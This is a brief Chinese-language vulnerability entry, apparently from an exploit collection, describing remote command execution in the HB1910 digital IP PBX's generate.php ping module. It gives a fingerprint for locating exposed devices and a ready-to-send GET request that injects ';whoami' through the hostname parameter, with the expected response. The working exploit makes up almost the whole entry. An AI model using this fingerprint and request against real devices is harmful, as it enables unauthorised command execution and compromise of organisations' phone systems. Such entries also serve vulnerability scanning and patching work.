# HB1910数字IP程控交换机generate.php存在远程命令执行漏洞

HB1910 ｜ 命令执行 ｜ —
- **指纹**：`body="themes/tenant/css/login.css"`
- **请求**：`GET /modules/ping/generate.php?send=Ping&hostname=;whoami HTTP/1.1`
- **响应特征**：200